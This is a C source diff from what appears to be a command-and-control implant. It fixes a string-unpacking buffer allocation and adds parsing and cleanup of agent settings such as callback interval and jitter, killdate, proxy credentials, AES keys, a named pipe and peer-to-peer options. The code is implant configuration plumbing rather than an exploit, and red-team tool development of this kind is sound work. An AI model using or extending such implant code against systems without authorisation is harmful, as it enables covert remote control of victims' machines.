@@ -78,8 +78,11 @@ char *unpack_str(char *buf, int *offset) {
 	char *str_ptr = &(buf[*offset]);
 	int str_len = MSVCRT$strlen(str_ptr);
 	
-	char *unpacked_str = KERNEL32$VirtualAlloc(0, str_len > 0 ? str_len : 10, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-	append_str(unpacked_str, str_ptr);
+	char *unpacked_str = KERNEL32$VirtualAlloc(0, str_len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	for (int i = 0; i < str_len; i++) {
+		unpacked_str[i] = str_ptr[i];
+	}
+	unpacked_str[str_len] = '\0';
 	
 	*offset += str_len + 1;
 	return unpacked_str;
@@ -103,6 +106,22 @@ void unpack_params(char *enc_params, char *key, int keylen, AgentParams *params)
 	params->callback_port = unpack_int(raw_params, &offset);
 	params->callback_https = unpack_int(raw_params, &offset);
 	params->callback_uri = unpack_str(raw_params, &offset);
+	params->get_uri = unpack_str(raw_params, &offset);
+	params->query_path_name = unpack_str(raw_params, &offset);
+	params->callback_interval = unpack_int(raw_params, &offset);
+	params->callback_jitter = unpack_int(raw_params, &offset);
+	params->killdate = unpack_str(raw_params, &offset);
+	params->headers = unpack_str(raw_params, &offset);
+	params->proxy_host = unpack_str(raw_params, &offset);
+	params->proxy_port = unpack_int(raw_params, &offset);
+	params->proxy_user = unpack_str(raw_params, &offset);
+	params->proxy_pass = unpack_str(raw_params, &offset);
+	params->aes_value = unpack_str(raw_params, &offset);
+	params->aes_key = unpack_str(raw_params, &offset);
+	params->encrypted_exchange_check = unpack_str(raw_params, &offset);
+	params->pipename = unpack_str(raw_params, &offset);
+	params->p2p_profile = unpack_str(raw_params, &offset);
+	params->p2p_port = unpack_int(raw_params, &offset);
 	
 	KERNEL32$VirtualFree(raw_params, 0, MEM_RELEASE);
 }
@@ -111,4 +130,16 @@ void free_params(AgentParams *params) {
 	if (params->payload_uuid != NULL) { KERNEL32$VirtualFree(params->payload_uuid, 0, MEM_RELEASE); }
 	if (params->callback_host != NULL) { KERNEL32$VirtualFree(params->callback_host, 0, MEM_RELEASE); }
 	if (params->callback_uri != NULL) { KERNEL32$VirtualFree(params->callback_uri, 0, MEM_RELEASE); }
+	if (params->get_uri != NULL) { KERNEL32$VirtualFree(params->get_uri, 0, MEM_RELEASE); }
+	if (params->query_path_name != NULL) { KERNEL32$VirtualFree(params->query_path_name, 0, MEM_RELEASE); }
+	if (params->killdate != NULL) { KERNEL32$VirtualFree(params->killdate, 0, MEM_RELEASE); }
+	if (params->headers != NULL) { KERNEL32$VirtualFree(params->headers, 0, MEM_RELEASE); }
+	if (params->proxy_host != NULL) { KERNEL32$VirtualFree(params->proxy_host, 0, MEM_RELEASE); }
+	if (params->proxy_user != NULL) { KERNEL32$VirtualFree(params->proxy_user, 0, MEM_RELEASE); }
+	if (params->proxy_pass != NULL) { KERNEL32$VirtualFree(params->proxy_pass, 0, MEM_RELEASE); }
+	if (params->aes_value != NULL) { KERNEL32$VirtualFree(params->aes_value, 0, MEM_RELEASE); }
+	if (params->aes_key != NULL) { KERNEL32$VirtualFree(params->aes_key, 0, MEM_RELEASE); }
+	if (params->encrypted_exchange_check != NULL) { KERNEL32$VirtualFree(params->encrypted_exchange_check, 0, MEM_RELEASE); }
+	if (params->pipename != NULL) { KERNEL32$VirtualFree(params->pipename, 0, MEM_RELEASE); }
+	if (params->p2p_profile != NULL) { KERNEL32$VirtualFree(params->p2p_profile, 0, MEM_RELEASE); }
 }
